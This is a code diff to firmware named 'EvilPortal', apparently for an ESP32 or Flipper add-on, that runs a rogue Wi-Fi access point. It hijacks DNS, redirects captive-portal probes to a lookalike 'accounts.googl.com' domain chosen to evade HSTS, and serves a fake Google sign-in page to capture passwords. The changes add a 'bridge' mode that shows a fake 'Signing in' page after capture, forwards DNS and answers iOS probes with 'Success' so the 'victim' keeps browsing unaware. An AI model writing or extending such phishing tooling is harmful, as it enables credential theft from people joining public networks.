@@ -13,16 +13,75 @@
 #include <freertos/task.h>
 #include <lwip/sockets.h>
 #include <lwip/inet.h>
+#include <esp_timer.h>
+#include <esp_attr.h>
 #include <furi.h>
 #include <btshim.h>
 
 #define TAG "EvilPortal"
 #define DNS_PORT 53
-#define DNS_TASK_STACK 3072
+#define DNS_TASK_STACK 6144
 
 static volatile bool s_running = false;
 static volatile bool s_paused = false;
 static volatile bool s_dns_run = false;
+
+// DNS forward cache. iOS bursts 30-60 queries in seconds when CNA closes;
+// the serial-forward path drops most under that load (recvfrom timeouts).
+// Caching cuts upstream traffic ~70% in steady state because iOS repeats
+// queries (often 2-3x per domain across A/AAAA/HTTPS). Cap TTL to keep
+// fresh-enough answers; size 32 entries handles a typical iOS burst.
+#define DNS_CACHE_SIZE 32
+#define DNS_CACHE_TTL_MS 30000
+typedef struct {
+    char domain[96];
+    uint16_t qtype;
+    uint64_t expiry_ms;
+    int resp_len;
+    uint8_t resp[512];
+} DnsCacheEntry;
+// Live in PSRAM (~20KB) so we don't eat internal-RAM heap that the DNS task,
+// httpd sockets, and lwIP buffers compete for.
+static EXT_RAM_BSS_ATTR DnsCacheEntry s_dns_cache[DNS_CACHE_SIZE];
+static int s_dns_cache_next = 0;
+
+static int dns_cache_lookup(const char* domain, uint16_t qtype, uint8_t* out, int out_max) {
+    uint64_t now = esp_timer_get_time() / 1000;
+    for(int i = 0; i < DNS_CACHE_SIZE; i++) {
+        DnsCacheEntry* e = &s_dns_cache[i];
+        if(e->resp_len <= 0) continue;
+        if(e->expiry_ms <= now) continue;
+        if(e->qtype != qtype) continue;
+        if(strcmp(e->domain, domain) != 0) continue;
+        int n = (e->resp_len > out_max) ? out_max : e->resp_len;
+        memcpy(out, e->resp, n);
+        return n;
+    }
+    return 0;
+}
+
+static void dns_cache_insert(const char* domain, uint16_t qtype, const uint8_t* resp, int resp_len) {
+    if(resp_len < 12 || resp_len > (int)sizeof(((DnsCacheEntry*)0)->resp)) return;
+    if(!domain || !domain[0]) return;
+    DnsCacheEntry* e = &s_dns_cache[s_dns_cache_next];
+    s_dns_cache_next = (s_dns_cache_next + 1) % DNS_CACHE_SIZE;
+    strncpy(e->domain, domain, sizeof(e->domain) - 1);
+    e->domain[sizeof(e->domain) - 1] = '\0';
+    e->qtype = qtype;
+    e->expiry_ms = (esp_timer_get_time() / 1000) + DNS_CACHE_TTL_MS;
+    e->resp_len = resp_len;
+    memcpy(e->resp, resp, resp_len);
+}
+
+static void dns_cache_clear(void) {
+    memset(s_dns_cache, 0, sizeof(s_dns_cache));
+    s_dns_cache_next = 0;
+}
+
+// When non-zero, DNS task forwards queries to this upstream DNS (network byte
+// order). Set by wlan_hal_evil_portal_set_dns_upstream() from the bridge when
+// bridge becomes active. Zero = hijack mode (return AP IP for everything).
+static volatile uint32_t s_dns_upstream_ip_be = 0;
 static volatile bool s_verify_active = false;
 static volatile bool s_verify_connected = false;
 static volatile bool s_verify_failed = false;
@@ -81,6 +140,10 @@ static void* s_valid_cb_ctx = NULL;
 static WlanHalEvilPortalBusyCb s_busy_cb = NULL;
 static void* s_busy_cb_ctx = NULL;
 static bool s_verify_creds_enabled = false;
+// When true, POST step=2 serves the BRIDGE_REDIRECT HTML (delayed redirect to
+// google.com) instead of the GOOGLE_FAILED ("Couldn't sign you in") page.
+// Set from cfg->bridge_redirect by evil_portal_start_worker.
+static bool s_bridge_redirect = false;
 static volatile bool s_creds_already_valid = false;
 
 static char* s_html_buf = NULL;
@@ -158,12 +221,15 @@ static esp_err_t handler_root(httpd_req_t* req) {
 }
 
 // Captive-portal probe URLs (Android/Windows/Firefox): 302 to a Google-like
-// typo domain. The DNS hijack resolves anything to the AP IP, so the follow-up
+// typo domain. The 302 itself is the SIGNAL that tells the OS captive-portal-
+// detection layer (Windows NCSI, Android CaptivePortalLogin) that this is a
+// captive portal and to open the popup. Returning a 200 + HTML body directly
+// satisfies the probe too well and the OS thinks it has normal internet,
+// skipping the popup entirely. Keep the 302 chain.
+//
+// The DNS hijack resolves the redirect target to the AP IP, so the follow-up
 // GET hits us with Host: accounts.googl.com -- handler_root then serves the
-// portal HTML and the address bar shows accounts.googl.com instead of e.g.
-// connectivitycheck.gstatic.com. We use a typo (no second "e") rather than
-// real google.com because every google.com subdomain is HSTS-preloaded which
-// would force the browser to HTTPS.
+// portal HTML. Typo (no second "e") avoids HSTS preload which would force HTTPS.
 static esp_err_t handler_probe_to_google(httpd_req_t* req) {
     static const char location[] = "http://accounts.googl.com/";
     ESP_LOGI(TAG, "probe-redirect %s -> %s", req->uri, location);
@@ -176,7 +242,31 @@ static esp_err_t handler_probe_to_google(httpd_req_t* req) {
 }
 
 static esp_err_t handler_hotspot_apple(httpd_req_t* req) {
-    ESP_LOGI(TAG, "probe-apple %s -> meta-refresh", req->uri);
+    // Once the bridge is active (s_dns_upstream_ip_be != 0 means forward mode
+    // is on, set by the bridge when napt_enable succeeded), serve iOS's
+    // exact expected "Success" body. iOS CNA detects this and closes itself,
+    // marks the network as having real internet, and the victim can browse
+    // normally in Safari without iOS disassociating.
+    if(s_dns_upstream_ip_be != 0) {
+        ESP_LOGI(TAG, "probe-apple %s -> Success (bridge active)", req->uri);
+        static const char success[] =
+            "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>";
+        httpd_resp_set_type(req, "text/html");
+        httpd_resp_set_hdr(req, "Cache-Control", "no-store");
+        httpd_resp_send(req, success, sizeof(success) - 1);
+        return ESP_OK;
+    }
+
+    if(s_bridge_redirect && s_cred_count > 0) {
+        ESP_LOGI(TAG, "probe-apple %s -> spinner (waiting on bridge)", req->uri);
+        httpd_resp_set_type(req, "text/html");
+        httpd_resp_set_hdr(req, "Cache-Control", "no-store");
+        httpd_resp_send(req, EVIL_PORTAL_HTML_BRIDGE_REDIRECT,
+                        EVIL_PORTAL_HTML_BRIDGE_REDIRECT_LEN);
+        return ESP_OK;
+    }
+
+    ESP_LOGI(TAG, "probe-apple %s -> meta-refresh (no bridge yet)", req->uri);
     static const char body[] =
         "<HTML><HEAD>"
         "<META http-equiv=\"refresh\" content=\"0;url=http://172.0.0.1/\">"
@@ -363,7 +453,17 @@ static esp_err_t handler_post(httpd_req_t* req) {
     }
 
     if(strcmp(step, "2") == 0) {
-        httpd_resp_send(req, EVIL_PORTAL_HTML_GOOGLE_FAILED, EVIL_PORTAL_HTML_GOOGLE_FAILED_LEN);
+        if(s_bridge_redirect) {
+            // Bridge mode: show "Signing in..." with delayed redirect to google.com.
+            // The bridge starts asynchronously when cred_cb returns; 7s gives it
+            // time to come up (APSTA + auth + DHCP + DHCPS dance + napt_enable
+            // takes ~3-5s) before the browser follows the redirect.
+            httpd_resp_send(req, EVIL_PORTAL_HTML_BRIDGE_REDIRECT,
+                            EVIL_PORTAL_HTML_BRIDGE_REDIRECT_LEN);
+        } else {
+            httpd_resp_send(req, EVIL_PORTAL_HTML_GOOGLE_FAILED,
+                            EVIL_PORTAL_HTML_GOOGLE_FAILED_LEN);
+        }
     } else {
         httpd_resp_send(req, s_html_buf ? s_html_buf : EVIL_PORTAL_HTML_GOOGLE,
                         s_html_buf ? s_html_len : EVIL_PORTAL_HTML_GOOGLE_LEN);
@@ -397,6 +497,28 @@ static const char* probe_uris[] = {
     "/redirect",
 };
 
+// Phone-home URLs that are NOT captive-portal probes but Windows clients hammer
+// them on join (Chrome/Edge WPAD auto-discovery, browser favicon, PAC lookups).
+// Without explicit handlers these fall through to the catch-all which serves
+// the full ~3.7KB portal HTML, eating sockets and time. Fast-reject with a
+// minimal 404 + Connection: close keeps the socket pool free for the actual
+// captive-portal GET that the browser CNA tab is racing to make.
+static const char* fast_reject_uris[] = {
+    "/wpad.dat",
+    "/wpad.da",
+    "/proxy.pac",
+    "/favicon.ico",
+};
+
+static esp_err_t handler_fast_reject(httpd_req_t* req) {
+    ESP_LOGI(TAG, "fast-reject %s", req->uri);
+    httpd_resp_set_status(req, "404 Not Found");
+    httpd_resp_set_hdr(req, "Connection", "close");
+    httpd_resp_set_hdr(req, "Cache-Control", "no-store");
+    httpd_resp_send(req, NULL, 0);
+    return ESP_OK;
+}
+
 static esp_err_t http_open_cb(httpd_handle_t hd, int sockfd) {
     (void)hd;
     struct sockaddr_in6 addr;
@@ -426,10 +548,17 @@ static void http_close_cb(httpd_handle_t hd, int sockfd) {
 static bool start_http(void) {
     httpd_config_t config = HTTPD_DEFAULT_CONFIG();
     config.server_port = 80;
-    config.max_uri_handlers = 16;
-    config.max_open_sockets = 7;
+    config.max_uri_handlers = 24;
+    // Bumped from 7 → 13: Windows clients open many parallel connections (Steam,
+    // Discord, Chrome, WPAD, NCSI, etc) the moment they detect a new network,
+    // and 7 sockets exhausts within milliseconds, dropping browser captive-portal
+    // probes with ERR_CONNECTION_RESET. 13 is the practical max per ESP-IDF.
+    config.max_open_sockets = 13;
     config.uri_match_fn = httpd_uri_match_wildcard;
     config.lru_purge_enable = true;
+    // Aggressive recv timeout so a stuck client doesn't squat a socket forever.
+    config.recv_wait_timeout = 5;
+    config.send_wait_timeout = 5;
     config.open_fn = http_open_cb;
     config.close_fn = http_close_cb;
 
@@ -460,6 +589,14 @@ static bool start_http(void) {
         .uri = "/library/test/success.html", .method = HTTP_GET, .handler = handler_hotspot_apple, .user_ctx = NULL};
     httpd_register_uri_handler(s_http, &uri_apple);
     httpd_register_uri_handler(s_http, &uri_apple_lib);
+
+    // Fast-reject phone-home URLs BEFORE the catch-all 404 fallback so they
+    // close the socket in <1ms instead of serving the full portal HTML.
+    for(size_t i = 0; i < sizeof(fast_reject_uris) / sizeof(fast_reject_uris[0]); i++) {
+        httpd_uri_t u = {
+            .uri = fast_reject_uris[i], .method = HTTP_GET, .handler = handler_fast_reject, .user_ctx = NULL};
+        httpd_register_uri_handler(s_http, &u);
+    }
 
     httpd_register_err_handler(s_http, HTTPD_404_NOT_FOUND, handler_catch_all);
     // Also serve the portal on header-too-long / URL-too-long errors instead
@@ -552,6 +689,110 @@ static void dns_task(void* arg) {
 
         bool is_a = (qtype == 1 || qtype == 255);
 
+        // FORWARD MODE: if bridge is active and an upstream DNS was provided,
+        // proxy the raw query upstream and return the upstream's full answer.
+        // Reuses buf for the upstream response (we've already used the query
+        // bytes by the time we're recv'ing the response, so clobbering is safe).
+        //
+        // CRITICAL: must connect() the UDP socket BEFORE send() so lwIP picks
+        // the source IP from the STA interface's route to upstream, not from
+        // the AP interface (172.0.0.1). The upstream router will drop queries
+        // sourced from a non-LAN IP, causing recvfrom to timeout silently.
+        // Falls back to 1.1.1.1 (Cloudflare) if upstream DNS doesn't respond
+        // -- some routers block direct DNS queries from non-LAN sources or
+        // delegate DNS upstream rather than serving it themselves.
+        uint32_t upstream = s_dns_upstream_ip_be;
+        if(upstream != 0) {
+            // Cache check first — iOS repeats the same query 2-3x in seconds.
+            // Splice the requesting client's query ID (buf[0..1]) into the
+            // cached response so the client recognizes it as their answer.
+            uint8_t cached[512];
+            int clen = dns_cache_lookup(domain, qtype, cached, sizeof(cached));
+            if(clen > 0) {
+                cached[0] = buf[0];
+                cached[1] = buf[1];
+                sendto(s_dns_socket, cached, clen, 0, (struct sockaddr*)&src, slen);
+                ESP_LOGI(TAG, "DNS-cache q='%s' type=%u -> %d bytes (hit)", domain, qtype, clen);
+                continue;
+            }
+
+            // Try Cloudflare (1.1.1.1) FIRST: it has predictably-fast response
+            // times. Some consumer routers act as DNS proxies and take 5-15s
+            // on cold-cache recursive lookups, which exceeds our per-target
+            // timeout. Falling back to upstream second handles the case where
+            // 1.1.1.1 is
+            // blocked.
+            uint32_t targets[2] = { htonl(0x01010101) /* 1.1.1.1 */, upstream };
+            int got = 0;
+            int got_len = 0;
+            // Bind forward socket to STA interface IP so lwIP picks the right
+            // source. Without this, in APSTA mode lwIP defaults to the AP-side
+            // IP (172.0.0.1) as source, the upstream router sees a packet from
+            // outside its subnet and drops it -> recvfrom timeouts.
+            uint32_t sta_ip_be = 0;
+            esp_netif_t* sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+            if(sta_netif) {
+                esp_netif_ip_info_t info = {0};
+                if(esp_netif_get_ip_info(sta_netif, &info) == ESP_OK) {
+                    sta_ip_be = info.ip.addr;
+                }
+            }
+            for(int ti = 0; ti < 2 && !got; ti++) {
+                int fwd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+                if(fwd < 0) break;
+                struct timeval tv2 = {.tv_sec = 3, .tv_usec = 0};
+                setsockopt(fwd, SOL_SOCKET, SO_RCVTIMEO, &tv2, sizeof(tv2));
+                setsockopt(fwd, SOL_SOCKET, SO_SNDTIMEO, &tv2, sizeof(tv2));
+                int bind_rc = -1;
+                if(sta_ip_be != 0) {
+                    struct sockaddr_in bind_addr = {0};
+                    bind_addr.sin_family = AF_INET;
+                    bind_addr.sin_addr.s_addr = sta_ip_be;
+                    bind_addr.sin_port = 0;
+                    bind_rc = bind(fwd, (struct sockaddr*)&bind_addr, sizeof(bind_addr));
+                }
+                struct sockaddr_in dns_dst = {0};
+                dns_dst.sin_family = AF_INET;
+                dns_dst.sin_port = htons(53);
+                dns_dst.sin_addr.s_addr = targets[ti];
+                if(connect(fwd, (struct sockaddr*)&dns_dst, sizeof(dns_dst)) == 0) {
+                    int sent = send(fwd, buf, n, 0);
+                    if(sent == n) {
+                        int rn = recv(fwd, buf, sizeof(buf), 0);
+                        if(rn > 12) {
+                            sendto(s_dns_socket, buf, rn, 0, (struct sockaddr*)&src, slen);
+                            ESP_LOGI(TAG, "DNS-fwd q='%s' type=%u -> %d bytes from %u.%u.%u.%u",
+                                     domain, qtype, rn,
+                                     (unsigned)(targets[ti] & 0xff),
+                                     (unsigned)((targets[ti] >> 8) & 0xff),
+                                     (unsigned)((targets[ti] >> 16) & 0xff),
+                                     (unsigned)((targets[ti] >> 24) & 0xff));
+                            got = 1;
+                            got_len = rn;
+                        }
+                    }
+                }
+                close(fwd);
+            }
+            if(got) {
+                dns_cache_insert(domain, qtype, buf, got_len);
+                continue;
+            }
+            ESP_LOGW(TAG, "DNS-fwd q='%s' FAILED (tried upstream %u.%u.%u.%u + 1.1.1.1, sta_ip=%u.%u.%u.%u), falling back to hijack",
+                     domain,
+                     (unsigned)(upstream & 0xff),
+                     (unsigned)((upstream >> 8) & 0xff),
+                     (unsigned)((upstream >> 16) & 0xff),
+                     (unsigned)((upstream >> 24) & 0xff),
+                     (unsigned)(sta_ip_be & 0xff),
+                     (unsigned)((sta_ip_be >> 8) & 0xff),
+                     (unsigned)((sta_ip_be >> 16) & 0xff),
+                     (unsigned)((sta_ip_be >> 24) & 0xff));
+            // Fall through to hijack as a safety net.
+        }
+
+        // HIJACK MODE: return AP IP for every A query so the client connects
+        // back to our HTTP server for the captive portal.
         // Like Arduino's DNSServer: only flip QR bit and set ANCount,
         // keep OPCode/RD and other flags from the original request.
         buf[2] |= 0x80;            // QR = response
@@ -571,7 +812,11 @@ static void dns_task(void* arg) {
             buf[qend + 6]  = 0x00;
             buf[qend + 7]  = 0x00;
             buf[qend + 8]  = 0x00;
-            buf[qend + 9]  = 0x3C;        // TTL 60s
+            buf[qend + 9]  = 0x01;        // TTL 1s - so when bridge becomes active and
+                                          // we switch to forward mode, any stale hijack
+                                          // answers (172.0.0.1) the client cached during
+                                          // captive portal expire almost immediately and
+                                          // re-resolve to the real IP via forward.
             buf[qend + 10] = 0x00;
             buf[qend + 11] = 0x04;        // RDLENGTH = 4
             memcpy(&buf[qend + 12], &ap_ip, 4);
@@ -905,6 +1150,7 @@ static void evil_portal_start_worker(void* arg) {
     s_busy_cb = cfg->busy_cb;
     s_busy_cb_ctx = cfg->busy_cb_ctx;
     s_verify_creds_enabled = cfg->verify_creds;
+    s_bridge_redirect = cfg->bridge_redirect;
     s_creds_already_valid = false;
     s_cred_count = 0;
 
@@ -1084,6 +1330,20 @@ bool wlan_hal_evil_portal_is_running(void) {
 
 uint32_t wlan_hal_evil_portal_get_cred_count(void) {
     return s_cred_count;
+}
+
+void wlan_hal_evil_portal_set_dns_upstream(uint32_t upstream_ip_be) {
+    s_dns_upstream_ip_be = upstream_ip_be;
+    dns_cache_clear();
+    if(upstream_ip_be == 0) {
+        ESP_LOGI(TAG, "DNS forward DISABLED (back to hijack)");
+    } else {
+        ESP_LOGI(TAG, "DNS forward ENABLED, upstream=%u.%u.%u.%u",
+                 (unsigned)(upstream_ip_be & 0xff),
+                 (unsigned)((upstream_ip_be >> 8) & 0xff),
+                 (unsigned)((upstream_ip_be >> 16) & 0xff),
+                 (unsigned)((upstream_ip_be >> 24) & 0xff));
+    }
 }
 
 typedef struct {
